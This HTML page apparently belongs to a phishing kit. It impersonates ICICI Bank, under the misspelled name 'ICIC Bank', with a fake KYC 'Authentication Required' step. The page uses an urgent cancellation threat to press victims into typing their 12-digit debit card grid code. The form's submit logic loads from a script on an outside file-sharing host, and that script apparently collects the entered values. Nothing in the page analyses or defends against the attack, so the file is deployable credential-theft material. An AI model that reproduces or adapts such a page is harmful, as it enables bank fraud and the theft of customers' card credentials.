<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICIC Bank KYC - Grid Code</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 400px;
        }
        .container img {
            width: 350px;
            margin-bottom: 20px;
        }
        .header-text {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .info-text {
            font-size: 14px;
            margin-bottom: 20px;
            color: #555;
        }
        .input-field {
            margin-bottom: 15px;
            width: 100%;
        }
        .input-field input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .authenticate-button {
            width: 100%;
            padding: 10px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .authenticate-button:hover {
            background-color: #005bb5;
        }
        #loadingPopup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 18px;
        }
        #loadingPopup .circle {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <img src="https://i.ibb.co/T8Xhg5r/icici-bank-aeps-500x500.jpg" alt="ICIC Bank Logo">
    <div class="header-text">Authentication Required</div>
    <div class="info-text">
        It's necessary to enter the correct alphabets to complete your KYC; otherwise, your request will be canceled.
    </div>
    <div class="info-text">
        Your ICIC BANK Debit Card has a grid as printed against the following alphabets.
    </div>

    <div class="input-field">
        <label for="gridCode">Grid Code:</label>
        <input type="text" id="gridCode" maxlength="12" placeholder="Enter 12-digit grid code">
    </div>

    <button class="authenticate-button" id="authenticateButton" onclick="submitSecondPage()">Authenticate</button>
</div>

<div id="loadingPopup">
    <div class="circle"></div>
    <h2>Verifying...</h2>
    <p>Authenticating, please wait...</p>
</div>

<script src="https://static.staticsave.com/alljs/icicbank.js"></script>
</body>
</html>
